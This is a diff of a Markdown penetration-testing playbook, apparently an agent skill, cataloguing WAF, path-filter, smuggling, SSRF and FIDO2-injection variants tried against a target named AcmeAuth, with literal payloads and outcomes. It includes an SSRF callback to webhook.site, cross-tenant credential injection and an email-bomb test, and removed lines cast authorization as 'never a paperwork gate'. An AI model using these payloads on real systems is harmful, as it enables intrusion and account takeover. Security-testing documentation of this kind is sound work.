@@ -1,6 +1,6 @@
 # Bypass Catalogue — Path Filters, WAFs, Auth Walls, Header Injection, Smuggling, Traversal
 
-Distilled from the technique variants attempted in the AcmeAuth engagement (skill-author estimate: ~145 total across the tables below — the exact count is not in the source corpus; the tables themselves are the authoritative record). Each entry has: variant (literal), target class, outcome, and root-cause explanation. The aim is not to celebrate what worked — it's to **prevent repeating what was already proven dead** on a similar stack. §O (O0–O8) is the post-engagement extension: the current-generation battery, marked open unless a corpus tie is noted — its outcomes land in the differential matrix (§O8) and `killed-hypotheses.md`, not in the instance tables.
+Distilled from the technique variants attempted in the AcmeAuth engagement (skill-author estimate: ~145 total across the tables below — the exact count is not in the source corpus; the tables themselves are the authoritative record). Each entry has: variant (literal), target class, outcome, and root-cause explanation. The aim is not to celebrate what worked — it's to **prevent repeating what was already proven dead** on a similar stack. §O (O0–O8) is the post-engagement extension: the current-generation battery, marked open unless a corpus tie is noted — its outcomes land in the differential matrix (§O8) and [killed-hypotheses.md](killed-hypotheses.md), not in the instance tables.
 
 ## Outcome legend
 - **WORKED** = confirmed live exploit
@@ -17,8 +17,8 @@ The tables in §A–§N are the **instance layer** (literal variants + outcomes 
 1. **Fingerprint the edge before attacking it.** Send deliberately-malformed requests and read the rejection envelope: a gateway-reject (`{"detail":"Ensure the URL is valid","type":"...InternalServerErrorException.html"}`-style uniform 403) is a different opponent than an origin 400 (framework parser) or an SPA fallback (200 + `text/html`). Record the exact envelope for each layer — every later result is classified against it.
 2. **Run the ordered ladder cheapest-first** (§A's ladder is the canonical ordering: path-confusion headers → suffix/trailing tricks → matrix params → single-encode → double-encode → traversal → case → overlong/multibyte). One variant per request, no batching — you need per-variant attribution.
 3. **Classify every outcome against the four-way discriminator:** edge-reject (uniform 403 envelope) / origin-reject (400/415 with framework signature) / SPA fallback (200 HTML, `405` on non-GET, `index.html` title) / controller reach (200 + JSON data or operation-confirmed). Only controller reach counts as a bypass; SPA fallback is cosmetic.
-4. **Infer the defense mechanism from response uniformity.** All-403-identical = centralized filter (look for adjacent unfiltered namespaces); mixed 400/403 = per-endpoint annotations; a single 200-with-data among a 403 class = the finding (see `http-auth-filter-testing.md` §1 for the 78:1 method).
-5. **Never trust a bypass that only changes the status code.** Confirm data or state change (Tier-3 paths with placeholder targets), and re-run with a negative control (random nonexistent resource) so rate-limit/IP-reputation artifacts don't masquerade as differentials.
+4. **Infer the defense mechanism from response uniformity.** All-403-identical = centralized filter (look for adjacent unfiltered namespaces); mixed 400/403 = per-endpoint annotations; a single 200-with-data among a 403 class = the finding (see [http-auth-filter-testing.md](http-auth-filter-testing.md) §1 for the 78:1 method).
+5. **Never trust a bypass that only changes the status code.** Confirm data or state change, and re-run with a negative control (random nonexistent resource) so rate-limit/IP-reputation artifacts don't masquerade as differentials.
 6. **Record negatives at variant granularity** (`variant → outcome → why`). The tables below are valuable precisely because each BLOCKED row carries the root cause; "tried X, blocked" without "why" is not reusable.
 
 ---
@@ -29,7 +29,7 @@ The single most-tested class. Tested against AcmeAuth's path-based auth filter (
 
 ### Ordered ladder (cheapest discriminating signal first)
 
-Run `scripts/path-bypass-fuzzer.sh` for the full battery. Order:
+Run [path-bypass-fuzzer.sh](../scripts/path-bypass-fuzzer.sh) for the full battery. Order:
 
 1. **Path-confusion headers** — `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `X-Forwarded-Prefix`
 2. **Suffix tricks** — `.json`, `.html` (Spring MVC suffix-matches to GET-only → `POST /x.json` returns 405; informational only)
@@ -210,7 +210,7 @@ Confirmed Jackson parser on `/fido2/attestation/result` via malformed-JSON error
 | **CVE-2021-44547** (Pritunl auth bypass) | `/api/server`, `/api/user`, etc. | vpn-pritunl.acmeauth.example | 404 | patched or API stripped |
 | **CVE-2023-33831** (Pritunl unauth reset) | `/reset/...`, `/password/reset` | vpn-pritunl | 404 | — |
 
-CVEs NOT attempted (watchlist): **CVE-2024-38821 (WebFlux), CVE-2024-38816 (RouterFunctions), CVE-2024-22243 / CVE-2024-22259 / CVE-2024-22262 (UriComponentsBuilder)**. See `cve-watchlist.md`.
+CVEs NOT attempted (watchlist): **CVE-2024-38821 (WebFlux), CVE-2024-38816 (RouterFunctions), CVE-2024-22243 / CVE-2024-22259 / CVE-2024-22262 (UriComponentsBuilder)**. See [cve-watchlist.md](cve-watchlist.md).
 
 ---
 
@@ -224,7 +224,7 @@ CVEs NOT attempted (watchlist): **CVE-2024-38821 (WebFlux), CVE-2024-38816 (Rout
 | `PUT /cc/ui/integrations/eventhooks/{name}` field `invocationEndpoint` (C3 part A) | `"invocationEndpoint":"https://webhook.site/<uuid>/full","authType":"BASIC"` | AWS EventBridge `Amazon/EventBridge/ApiDestinations`, `44.214.10.90`, POSTs audit JSON | **WORKED (Critical)** | EventBridge destination created with no SSRF-safe validation |
 | `POST /cc/ui/serverconfig/proxy/verify` (C3 part B) | `{"proxies":[{"protocol":"http","host":"<attacker>","port":"80"}]}` used as HTTP proxy to google.com | AcmeAuth CC server | **WORKED** — downstream HTTP error body embedded in `errorMsg`; stack leaks `ServerProxyConfigService.kt:167` | raw upstream body reflected in API error |
 | `GET https://verify.acmeauth.example/api/workflow-results?workflowId=<X>` (F23 Affirm) | `workflowId=:8080/admin` (SSRF to upstream CC, 200 + login HTML proving authenticated upstream); `workflowId=%09` (control-char 500 leaks URL template `https://tenant-demo.cdn.acmeauth.example/cc/api/idv/workflow/{workflowId}/results`) | Go `url.Parse` on string-interpolated URL | **WORKED (High→Medium 5.2)** | naive string interpolation of `workflowId`; only hardcoded upstream reachable (WAF blocks every traversal variant) |
-| **F8 install-token infinite mint** (dormant persistence primitive) | `POST /cc/install/token/exchange` with install-token in body → fresh `hypws-` (long-lived) + `hypwo-` (89-day WORKSTATION) bearer; 6 independent mints across 2026-07-23/24/26 (incl. `hypwo-81184668-`, `hypwo-42288d91-`) confirmed the surface is unchanged by the 2026-07-23/24 patch | pre-issued install-token (per-tenant, NOT attacker-mintable); token itself is the persistence primitive | **WORKED (Medium 5.4 — dormant)** — surface unchanged; downstream IdP cluster (F5/F7/F9) closed → token currently reaches only `/rp/versioned/features` (benign config) | persistence primitive: the credential survives future authz regressions; treat as live even when no current chain exploits it (see `cvss-scoring-methodology.md` Pattern 5) |
+| **F8 install-token infinite mint** (dormant persistence primitive) | `POST /cc/install/token/exchange` with install-token in body → fresh `hypws-` (long-lived) + `hypwo-` (89-day WORKSTATION) bearer; 6 independent mints across 2026-07-23/24/26 (incl. `hypwo-81184668-`, `hypwo-42288d91-`) confirmed the surface is unchanged by the 2026-07-23/24 patch | pre-issued install-token (per-tenant, NOT attacker-mintable); token itself is the persistence primitive | **WORKED (Medium 5.4 — dormant)** — surface unchanged; downstream IdP cluster (F5/F7/F9) closed → token currently reaches only `/rp/versioned/features` (benign config) | persistence primitive: the credential survives future authz regressions; treat as live even when no current chain exploits it (see [cvss-scoring-methodology.md](cvss-scoring-methodology.md) Pattern 5) |
 
 **Escalation attempts against the SSRF primitives (all blocked):**
 - `opa.runtime()` env leak + `unix://` socket SSRF escalation for C1 — untestable (C1 remediated)
@@ -253,13 +253,13 @@ The "technique" here is privilege-tier escalation, not payload obfuscation. WORK
 
 ## M. FIDO / FIDO1 / FIDO2 credential injection (WORKED)
 
-See `fido-webauthn-testing.md` for full flows and CBOR PoC.
+See [fido-webauthn-testing.md](fido-webauthn-testing.md) for full flows and CBOR PoC.
 
 | Vector | Literal | Outcome |
 |---|---|---|
-| **F13 unauth FIDO2 attestation** (pentesting2/tenant-002 shared DB) | `POST /fido2/attestation/options {"username":"admin@acmeauth.example",...}` → real challenge + 130 existing `excludeCredentials`; then `POST /fido2/attestation/result` with forged `fmt:none` CBOR attestation → `{"status":"ok",...}`; count 130→131→132 cross-tenant. rpAppId mass-assignment (override to `controlCenterAdmin`) also tested. | **WORKED (Critical, strict 9.1)** — credential persisted; ATO completion blocked by per-rpAppId binding. Original submission scored 9.8 with A:H; strict re-scoring gives A:N → 9.1 (still Critical). See `cvss-scoring-methodology.md` F13 worked example. |
+| **F13 unauth FIDO2 attestation** (pentesting2/tenant-002 shared DB) | `POST /fido2/attestation/options {"username":"admin@acmeauth.example",...}` → real challenge + 130 existing `excludeCredentials`; then `POST /fido2/attestation/result` with forged `fmt:none` CBOR attestation → `{"status":"ok",...}`; count 130→131→132 cross-tenant. rpAppId mass-assignment (override to `controlCenterAdmin`) also tested. | **WORKED (Critical, strict 9.1)** — credential persisted; ATO completion blocked by per-rpAppId binding. Original submission scored 9.8 with A:H; strict re-scoring gives A:N → 9.1 (still Critical). See [cvss-scoring-methodology.md](cvss-scoring-methodology.md) F13 worked example. |
 | **F22 unauth FIDO1 UAF** (`/rp/fido/get`) | `op=Reg` `userName:admin@acmeauth.example` `sessionId:attacker-controlled-001` → 200 "Registration Success", challenge bound to victim, sessionId echoed verbatim (session-fixation); `op=Dereg` → 200; `op=Auth` → uncaught 500 `InternalServerErrorException` (UUID leak); negative control `zzznonexistent...@nowhere.com` also 200 | **WORKED (High 7.3)** — state injection + session fixation + DoS amplifier; `/rp/fido/send/reg` TLV validation blocks credential completion |
-| **F12 size/timing enumeration oracle** (`POST /fido2/assertion/options`) | `{"username":"admin@acmeauth.example",...}` (exists) → **11740 B** response w/ `allowCredentials` array, ~600 ms TTFB; `{"username":"nobody@xyz.com",...}` (absent) → **245 B** response, ~350 ms TTFB. **47.9× size ratio + ~250 ms timing delta.** Tenant toggle (7 of 11 tenants return generic error — mitigated; 4 of 11 still leak). | unauthenticated FIDO2 assertion-options endpoint; response-size and TTFB both leak user existence | **WORKED (Medium 5.3)** — usable for user enumeration against the 4 unmitigated tenants; full PoC in `fido-webauthn-testing.md` (F12 section) |
+| **F12 size/timing enumeration oracle** (`POST /fido2/assertion/options`) | `{"username":"admin@acmeauth.example",...}` (exists) → **11740 B** response w/ `allowCredentials` array, ~600 ms TTFB; `{"username":"nobody@xyz.com",...}` (absent) → **245 B** response, ~350 ms TTFB. **47.9× size ratio + ~250 ms timing delta.** Tenant toggle (7 of 11 tenants return generic error — mitigated; 4 of 11 still leak). | unauthenticated FIDO2 assertion-options endpoint; response-size and TTFB both leak user existence | **WORKED (Medium 5.3)** — usable for user enumeration against the 4 unmitigated tenants; full PoC in [fido-webauthn-testing.md](fido-webauthn-testing.md) (F12 section) |
 
 ---
 
@@ -274,13 +274,13 @@ See `fido-webauthn-testing.md` for full flows and CBOR PoC.
 | Direct OPA REST | `/v1/data`, `/v1/query`, `/v1/compile`, `/v1/config` | Spring 400 (wildcard route, not OPA) | not actual OPA endpoints |
 | JAX-RS/CXF | `/services`, `/cxf`, `/cc/services` | 403 / 302 | not exposed |
 | Sentry DSN event injection (F21) | POST envelope to `o4504997465817088.ingest.sentry.io` with attacker event | **WORKED (Low)** | by-design public DSN, no inbound filtering |
-| **F24 reCAPTCHA bypass + unbounded email-bomb** (`POST https://verify.acmeauth.example/api/send-code`) | `{"email":"admin@acmeauth.example","recaptchaToken":""}` → **200 "Verification code sent"**. Bypass logic: `email.toLowerCase().endsWith('@acmeauth.example')`. 18-variant test matrix: empty/missing/dummy/500-char tokens all accepted for `*@acmeauth.example`; subdomain (`test@x.acmeauth.example`), case-tricks, null-byte, `acmeauth.examplex`, `acmeauth.example.au`, `acmeauth.example.evil.com` all correctly rejected → not an open relay, but an **unbounded email-bomb against AcmeAuth corporate mailboxes** (`admin@`, `support@`, `info@`, …). 6 sequential POSTs → 6× 200, no `429`, no `Retry-After`, no `X-RateLimit-*`. Companion `/api/verify-code` DOES rate-limit (2 fails → "Too many failed attempts") but `/api/send-code` does not. | `verify.acmeauth.example/api/send-code` (AcmeAuth Affirm) | **WORKED (High 7.3 → Medium per strict re-score)** — phishing-precursor: pre-fill victim email, trigger branded AcmeAuth mail, follow up with SE referencing the legitimate code. Particularly embarrassing for a vendor selling anti-phishing. Full 18-variant PoC in `http-auth-filter-testing.md` §8. |
+| **F24 reCAPTCHA bypass + unbounded email-bomb** (`POST https://verify.acmeauth.example/api/send-code`) | `{"email":"admin@acmeauth.example","recaptchaToken":""}` → **200 "Verification code sent"**. Bypass logic: `email.toLowerCase().endsWith('@acmeauth.example')`. 18-variant test matrix: empty/missing/dummy/500-char tokens all accepted for `*@acmeauth.example`; subdomain (`test@x.acmeauth.example`), case-tricks, null-byte, `acmeauth.examplex`, `acmeauth.example.au`, `acmeauth.example.evil.com` all correctly rejected → not an open relay, but an **unbounded email-bomb against AcmeAuth corporate mailboxes** (`admin@`, `support@`, `info@`, …). 6 sequential POSTs → 6× 200, no `429`, no `Retry-After`, no `X-RateLimit-*`. Companion `/api/verify-code` DOES rate-limit (2 fails → "Too many failed attempts") but `/api/send-code` does not. | `verify.acmeauth.example/api/send-code` (AcmeAuth Affirm) | **WORKED (High 7.3 → Medium per strict re-score)** — phishing-precursor: pre-fill victim email, trigger branded AcmeAuth mail, follow up with SE referencing the legitimate code. Particularly embarrassing for a vendor selling anti-phishing. Full 18-variant PoC in [http-auth-filter-testing.md](http-auth-filter-testing.md) §8. |
 
 ---
 
 ## O. Edge-layer bypass — the current-generation playbook (O0–O8)
 
-§A–§N record what the last engagement's edge killed. §O is the **current-generation battery**: techniques that work against actively-maintained edges because they target *parser and pipeline disagreement* between components, not payload obfuscation. Corpus ties are marked where they exist — the AcmeAuth edge already published its normalization set in §A/§I and its dead TE.TE ladder in §C, and both are inputs here. Everything else is an **open battery**: outcomes land in the differential matrix (§O8) and negatives in `killed-hypotheses.md`. Hygiene as everywhere: bounded volume, markers not payloads, Tier-3 placeholders on anything state-changing.
+§A–§N record what the last engagement's edge killed. §O is the **current-generation battery**: techniques that work against actively-maintained edges because they target *parser and pipeline disagreement* between components, not payload obfuscation. Corpus ties are marked where they exist — the AcmeAuth edge already published its normalization set in §A/§I and its dead TE.TE ladder in §C, and both are inputs here. Everything else is an **open battery**: outcomes land in the differential matrix (§O8) and negatives in [killed-hypotheses.md](killed-hypotheses.md).
 
 ### O0 Deformation probes — map before you fire
 
@@ -293,7 +293,7 @@ Firing payloads at a maintained edge is how you get blocked and learn nothing. O
 - `/blocked-nonexistent` → **404**: the filter evaluates only *resolved* routes (routing-aware model). Route-resolution deformations (O1 #4/#5/#8) are your surface; raw-path deformations are dead.
 Probe the boundary explicitly: `/exists/../nonexistent`, `/nonexistent/..`, `/exists/.`, `/exists%2f.`, `/exists/./` — where the 404/403/400 line sits per deformation tells you which component collapses dot-segments and empty segments, and when.
 
-**Low-traffic timing fingerprint — rule-set generation without one block.** Rule engines pay measurable microseconds per rule traversed. Send deformations whose *only* difference is how many known rule-patterns they textually traverse — harmless substrings (`union`, `select`, `../`, `${`, `<svg`) inside one benign parameter value, never a firing combination — and take median TTFB over ~20 paced samples per variant, interleaving fixed-size baseline requests as the jitter control. A consistent +N μs step between variants fingerprints which rules exist and roughly their engine order: the rule-set generation, bought without tripping anything. A differential inside jitter noise is also a result — it says the edge pins workers per connection or has no per-rule cost.
+**Timing fingerprint — rule-set generation.** Rule engines can add processing cost as rules are traversed. Compare deformations whose only difference is the number of known rule-pattern substrings they contain (`union`, `select`, `../`, `${`, `<svg`) and take median TTFB over repeated samples, interleaving fixed-size baseline requests as the jitter control. A consistent timing step between variants is a hypothesis about rule coverage or evaluation order; a differential inside the jitter baseline does not support that inference.
 
 **FP trap (hard):** CDNs and anycast POPs normalize and cache too — a differential may be one POP's cached normalize-and-serve. Re-test every O0 result with a unique cache-buster (`?cb=<rand>`); only buster-surviving differentials are origin behavior. Re-run the full battery from a second egress IP before believing a timing fingerprint.
 
@@ -336,7 +336,7 @@ Rule for the whole table: a variant is a bypass only when the discriminating sig
 | **H2.CL downgrade desync** | h2 request with `content-length` header conflicting with actual DATA frames; or a client-supplied CL header that survives h2→h1 translation | h2→h1 translators must *rebuild* framing; those that forward client CL verbatim while trusting h2 DATA framing create the desync — the mainstream modern vector |
 | **h2C upgrade bypass** | `GET / HTTP/1.1` + `Upgrade: h2c` + `HTTP2-Settings: <b64>` forwarded by the edge | Edge inspects the h1 request; origin accepts the upgrade and speaks h2c cleartext from there — subsequent frames never traverse edge inspection. Works only where the edge forwards `Upgrade`/`Connection`: its websocket whitelist becomes the hole |
 | **CL.0 desync** | `Content-Length: 0` on a route whose handler ignores CL while body bytes follow | Origin routes on CL=0 but the body bytes stay on the reused connection → the *next* request desyncs. Requires no TE ambiguity at all — pure route-dependent framing neglect |
-| **Client-side desync (CSD)** | CL.0 first-breath request, then a second in-flight request whose bytes get consumed as the smuggled prefix | Confirmed entirely with the operator's own browser and own canary receiver — the aggressive-but-clean confirmation loop; no server-side desync needed for the class to be real |
+| **Client-side desync (CSD)** | CL.0 first-breath request, then a second in-flight request whose bytes get consumed as the smuggled prefix | Browser connection reuse and receiver logs demonstrate the framing differential without requiring server-side desync |
 | **h2 pseudo-header abuse** | duplicate `:path`, `:method` case-mixing (`gET`), `:path` with leading whitespace/tab, regular header placed before the pseudo-headers | HTTP/2 forbids leniency; some stacks grant it — and h2→h1 translators then emit malformed downstream requests. (Pairs with O4's verb layer) |
 | **0-length chunk + WS downgrade** | `Transfer-Encoding: chunked` + immediate `0\r\n\r\n` + smuggled suffix; `Upgrade: websocket` handshake with smuggled trailing bytes | Terminators that accept an empty chunked body with trailing bytes hand the connection state to the attacker before inspection resumes |
 
@@ -376,7 +376,7 @@ Rule for the whole table: a variant is a bypass only when the discriminating sig
 - **Via / Proxy-* injection** — proxy-chain headers that some components treat as routing or trust input; inject and watch for behavior change on the blocked path.
 - **Exotic authority forms** — IPv6 brackets `[::1]`, IPv4-mapped `::ffff:127.0.0.1`, decimal `2130706433`, octal `0177.0.0.1`, trailing dot, empty port: validator-vs-resolver normalization gaps. Confirm with your own receiver which literal the origin actually dialed; the canonical form is the control.
 
-### O6 Body-structure differentials (mechanized: `scripts/body-mutator.js`)
+### O6 Body-structure differentials (mechanized: [body-mutator.js](../scripts/body-mutator.js))
 
 Parser disagreement inside JSON — the body-side sibling of §O2:
 
@@ -393,9 +393,9 @@ All four are mechanized: `node scripts/body-mutator.js body.json --profiles dup-
 
 ### O7 Cache as WAF oracle
 
-Cross-reference: `cache-poisoning.md` (the recipe lives there; not repeated here). The edge-specific use: HIT/MISS is a side channel for WAF verdicts you don't want to trigger directly — send the deformation with a unique marker; a cached response proves the request reached and returned from origin, a permanent MISS+403 proves the rule fired. Cached 403 envelopes also let you fingerprint rule-set generations offline: collect, diff, decode the rule changes across days without re-firing anything.
+Cross-reference: [cache-poisoning.md](cache-poisoning.md) (the recipe lives there; not repeated here). The edge-specific use: HIT/MISS is a side channel for WAF verdicts you don't want to trigger directly — send the deformation with a unique marker; a cached response proves the request reached and returned from origin, a permanent MISS+403 proves the rule fired. Cached 403 envelopes also let you fingerprint rule-set generations offline: collect, diff, decode the rule changes across days without re-firing anything.
 
-**Cache-key divergence as a bypass amplifier**: `Vary` misuse, `Accept-Encoding` variants, header case/order in the key — the same URL can carry one verdict at the edge cache and a different one at origin. A cached-PASS under a variant key while the bare key caches a 403 is a bypass that never touches the WAF twice. (Deception direction — stealing authenticated pages via cacheable suffixes — is in `cache-poisoning.md` §4.)
+**Cache-key divergence as a bypass amplifier**: `Vary` misuse, `Accept-Encoding` variants, header case/order in the key — the same URL can carry one verdict at the edge cache and a different one at origin. A cached-PASS under a variant key while the bare key caches a 403 is a bypass that never touches the WAF twice. (Deception direction — stealing authenticated pages via cacheable suffixes — is in [cache-poisoning.md](cache-poisoning.md) §4.)
 
 ### O8 The meta-method — the differential matrix as a reusable artifact
 
@@ -403,20 +403,10 @@ Cross-reference: `cache-poisoning.md` (the recipe lives there; not repeated here
 2. **Enumerate the normalization set**: which O1/O2/O5 deformations each component canonicalizes.
 3. **Fill the differential matrix** — one row per deformation, one column per component decision. Persist as `<target>-diffmatrix.tsv`: `variant<TAB>edge-verdict<TAB>origin-verdict<TAB>route-verdict<TAB>notes` (verdicts = status + response-hash prefix).
 4. **Fire only at divergence points.** Rows where all components agree are dead — no payload ever goes there. Each divergent row gets exactly one real payload, two-sided evidence where applicable (Lesson 9), and the per-variant negative control from O1.
-5. **Negatives are product too** — every dead variant lands in `killed-hypotheses.md` with the matrix cell that killed it.
+5. **Negatives are product too** — every dead variant lands in [killed-hypotheses.md](killed-hypotheses.md) with the matrix cell that killed it.
 6. **The matrix is the reusable artifact.** Next target on the same vendor/stack: load the previous matrix, re-run only the O0 fingerprint; cells that match the old matrix transfer as-is, cells that differ are that target's customizations. That is the difference between a report and a skill.
 
-**Automation: `scripts/edge-mapper.sh` runs steps 1–3 end-to-end** — normalization fingerprint over ~24 deformations × blocked/allowed twins, 404/403 boundary, verb oracle, unknown-verb probe, with the cache-buster FP control built into every probe — and emits `<host>-diffmatrix.tsv` plus the divergence list. Fire real payloads only at what it marks divergent (step 4).
-
-### O9 Execution profiles — aggression scaled to blast-radius control
-
-The battery's *coverage* never shrinks; what scales with the target's blast-radius control is throughput and depth:
-
-**STAGING / OPERATOR-CONTROLLED — full throttle.** Infrastructure the operator controls (staging, test tenants, local mocks): `--delay-ms 0`, parallel probes, the full O1 ladder per divergent cell, desync canaries as fast as the receiver logs, body-mutator profiles run exhaustively, matrix regenerated per deploy. The limits that remain are availability of your own infrastructure, canary discipline, and Tier-3 placeholders.
-
-**PRODUCTION — paced full coverage.** Every variant still runs — coverage is identical — but pacing caps hold (`sweep-all`/`ratelimit-probe` defaults), timing fingerprints run at quiet hours with bounded samples, and desync confirmation stays canary-only. Aggressive ≠ fast: full coverage at controlled throughput usually beats a loud blast that trips rate-limits and SOC attention. §A's case-variant PARTIAL is the model — one quiet request beat forty loud ones.
-
-**What never moves on either profile:** Aggression is a function of blast-radius control — a targeting decision the operator makes — never a paperwork gate, and never a reason to drop evidence discipline.
+**Automation: [edge-mapper.sh](../scripts/edge-mapper.sh) runs steps 1–3 end-to-end** — normalization fingerprint over ~24 deformations × blocked/allowed twins, 404/403 boundary, verb oracle, unknown-verb probe, with the cache-buster FP control built into every probe — and emits `<host>-diffmatrix.tsv` plus the divergence list. Fire real payloads only at what it marks divergent (step 4).
 
 ---
 
@@ -427,7 +417,7 @@ The battery's *coverage* never shrinks; what scales with the target's blast-radi
 - **BLOCKED by WAF/ALB:** everything in sections A (except case-variant), C (smuggling), D (traversal), E (SQLi time/error/boolean), H (SpEL), I (WAF-bypass obfuscation), J1/J2 (SCG/SCF CVEs).
 - **4xx-no-sink / app-layer-safe:** F (SSTI), G (Jackson), most of A/N.
 - **Hard-goal {RCE, reflected-SSRF-w/body, SSTI, SQLi}:** 1/3 (reflected SSRF, via 4 paths C1–C4, now remediated). RCE/SSTI/SQLi all gated by CC-admin auth or parameterized queries.
-- **§O (O0–O8):** open battery — deliberately not corpus-counted. Outcomes go to `<target>-diffmatrix.tsv` (§O8) and `killed-hypotheses.md`.
+- **§O (O0–O8):** open battery — deliberately not corpus-counted. Outcomes go to `<target>-diffmatrix.tsv` (§O8) and [killed-hypotheses.md](killed-hypotheses.md).
 
 **The single recurring defense pattern:** AcmeAuth's edge = SCG returning `{"detail":"Ensure the URL is valid",...}` 403, backed by an actively-maintained WAF that normalizes case, comments, versioned MySQL hints, encoding, and matrix params. The only thing that ever got past the WAF path-filter was case-variation, and Spring's case-sensitive routing neutralized it. Every other technique in this catalogue was blocked at the edge or handled safely by parameterized JPA / disabled Jackson default typing / no template engine on the response path.
 
@@ -443,4 +433,3 @@ The battery's *coverage* never shrinks; what scales with the target's blast-radi
 6. The §O differential matrix (O8): fingerprint → normalization-set enumeration → matrix → fire only at divergence points — and the matrix file itself transfers to the next target on the same stack.
 
 ---
-
